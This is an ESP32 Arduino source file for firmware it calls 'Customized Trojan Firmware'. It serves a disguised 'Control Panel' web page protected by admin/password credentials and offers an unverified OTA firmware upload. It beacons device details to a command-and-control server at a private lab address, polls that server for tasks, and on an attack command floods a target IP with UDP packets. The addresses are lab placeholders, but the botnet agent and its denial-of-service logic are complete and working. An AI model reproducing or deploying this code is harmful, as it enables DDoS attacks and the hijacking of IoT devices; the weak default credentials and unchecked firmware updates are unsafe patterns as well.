#include <WiFi.h>
#include <WebServer.h>
#include <Update.h>
#include <WiFiUdp.h>
#include <HTTPClient.h>

// ── Network Configuration ──────────────────────────────────────────
const char* SSID         = "Mock_Lab";
const char* PASSWORD     = "password";
const char* HOST_NAME    = "esp32-mock-node";
const char* WWW_USER     = "admin";
const char* WWW_PASS     = "password";

const char* DEVICE_ID    = "dev-esp32mock01"; 

// ── Custom C2 Server Config ────────────────────────────────────────
const char* C2_HOST      = "172.18.0.1"; 
const int C2_PORT        = 5000;         

WebServer server(80);
WiFiUDP udpClient;

// ── State Variables ───────────────────────────────────────────────
bool attack_active       = false;
String target_ip_str     = "0.0.0.0";    // Safe idle default
int target_port          = 80;
String current_task_id   = "0";

unsigned long last_heartbeat = 0;
const unsigned long heartbeat_interval = 15000; 

const int packet_size = 64;
char packet_buffer[packet_size];

// ── Masqueraded Clean UI ───────────────────────────────────
const char HTML_INDEX[] PROGMEM = R"(
<!DOCTYPE html><html><head>
<meta charset='utf-8'><title>Control Panel</title>
<style>body{font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px}</style>
</head><body>
<h1>Control Panel</h1>
<p>System Online.</p>
<p>Uptime: <span id='up'></span></p>
<a href='/ota'>⚙ Advanced Settings (OTA)</a>
<script>
  fetch('/status').then(r=>r.json()).then(d=>{
    document.getElementById('up').textContent = d.uptime + 's';
  });
</script>
</body></html>
)";

const char HTML_OTA[] PROGMEM = R"(
<!DOCTYPE html><html><head>
<meta charset='utf-8'><title>OTA Update</title>
<style>body{font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px}</style>
</head><body>
<h2>Firmware Update</h2>
<form method='POST' action='/update' enctype='multipart/form-data'>
  <input type='file' name='update' accept='.bin'>
  <br><br>
  <input type='submit' value='Flash Firmware'>
</form>
</body></html>
)";

void handleRoot() {
  if (!server.authenticate(WWW_USER, WWW_PASS)) return server.requestAuthentication();
  server.send_P(200, "text/html", HTML_INDEX);
}

void handleOTA() {
  if (!server.authenticate(WWW_USER, WWW_PASS)) return server.requestAuthentication();
  server.send_P(200, "text/html", HTML_OTA);
}

void handleStatus() {
  if (!server.authenticate(WWW_USER, WWW_PASS)) return server.requestAuthentication();
  String json = "{\"uptime\":" + String(millis() / 1000) + ",\"heap\":" + String(ESP.getFreeHeap()) + "}";
  server.send(200, "application/json", json);
}

void handleUpdateDone() {
  bool ok = !Update.hasError();
  server.send(200, "text/plain", ok ? "Success. Restarting..." : "Update failed!");
  delay(500);
  ESP.restart();
}

void handleUpdateUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    Update.begin(UPDATE_SIZE_UNKNOWN);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    Update.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END) {
    Update.end(true);
  }
}

// ── Outbound C2 Communication Functions ────────────────────────────
void reportResult(String taskId, String msg) {
  if (WiFi.status() != WL_CONNECTED) return;

  HTTPClient http;
  String url = "http://" + String(C2_HOST) + ":" + String(C2_PORT) + "/result";
  http.begin(url);
  http.addHeader("Content-Type", "application/json");

  String jsonPayload = "{";
  jsonPayload += "\"device_id\":\"" + String(DEVICE_ID) + "\",";
  jsonPayload += "\"task_id\":" + taskId + ","; 
  jsonPayload += "\"result\":\"" + msg + "\"";
  jsonPayload += "}";

  http.POST(jsonPayload);
  http.end();
}

void sendHeartbeat() {
  if (WiFi.status() != WL_CONNECTED) return;

  HTTPClient http;
  String url = "http://" + String(C2_HOST) + ":" + String(C2_PORT) + "/heartbeat";
  http.begin(url);
  http.addHeader("Content-Type", "application/json");

  String jsonPayload = "{";
  jsonPayload += "\"device_id\":\"" + String(DEVICE_ID) + "\",";
  jsonPayload += "\"cpu_load\":" + String(random(5, 25)) + ",";
  jsonPayload += "\"memory\":" + String((float)ESP.getFreeHeap() / 1024.0) + ",";
  jsonPayload += "\"uptime\":" + String(millis() / 1000) + ",";
  jsonPayload += "\"arch\":\"XTensa_LX6\",";
  jsonPayload += "\"ip\":\"" + WiFi.localIP().toString() + "\"";
  jsonPayload += "}";

  http.POST(jsonPayload);
  http.end();
}

void checkTasks() {
  if (WiFi.status() != WL_CONNECTED) return;

  HTTPClient http;
  String url = "http://" + String(C2_HOST) + ":" + String(C2_PORT) + "/tasks?device_id=" + String(DEVICE_ID);
  http.begin(url);

  int httpCode = http.GET();
  if (httpCode == 200) {
    String payload = http.getString();
    
    // Check if there is an active instruction string
    if (payload.startsWith("TASK_ID:")) {
      
      // Parse out the Task ID cleanly
      int pipeIdx = payload.indexOf("|");
      current_task_id = payload.substring(8, pipeIdx);
      
      // Look for your customized task names
      if (payload.indexOf("CMD:ATTACK") != -1) {
        target_ip_str = "172.18.0.99"; // Production victim routing placeholder
        attack_active = true;
        reportResult(current_task_id, "ACK_ATTACK_START");
      } 
      else if (payload.indexOf("CMD:STOP") != -1 || payload.indexOf("CMD:SLEEP") != -1) {
        attack_active = false;
        target_ip_str = "0.0.0.0";
        reportResult(current_task_id, "ACK_ATTACK_STOPPED");
      }
    }
  }
  http.end();
}

// ── WiFi Initialization ────────────────────────────────────────────
bool connectWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.setHostname(HOST_NAME);
  
  IPAddress local_IP(172, 18, 0, 50);
  IPAddress gateway(172, 18, 0, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.config(local_IP, gateway, subnet);
  WiFi.begin(SSID, PASSWORD);
  
  int elapsed = 0;
  while (WiFi.status() != WL_CONNECTED && elapsed < 20) { delay(500); elapsed++; }
  return (WiFi.status() == WL_CONNECTED);
}

void setup() {
  Serial.begin(115200);
  if (!connectWiFi()) ESP.restart();

  memset(packet_buffer, 'A', packet_size); 

  server.on("/",       HTTP_GET,  handleRoot);
  server.on("/ota",    HTTP_GET,  handleOTA);
  server.on("/status", HTTP_GET,  handleStatus);
  server.on("/update", HTTP_POST, handleUpdateDone, handleUpdateUpload);

  server.begin();
  Serial.println("[SYSTEM] Customized Trojan Firmware Running.");
}

void loop() {
  server.handleClient();

  if (millis() - last_heartbeat > heartbeat_interval) {
    sendHeartbeat();
    checkTasks();
    last_heartbeat = millis();
  }

  // Stress-testing UDP loop execution (Only fires if target is not development dummy)
  if (attack_active && target_ip_str != "0.0.0.0") {
    IPAddress targetIP;
    if (targetIP.fromString(target_ip_str)) {
      for (int i = 0; i < 10; i++) {
        udpClient.beginPacket(targetIP, target_port);
        udpClient.write((uint8_t*)packet_buffer, packet_size);
        udpClient.endPacket();
      }
    }
  }
}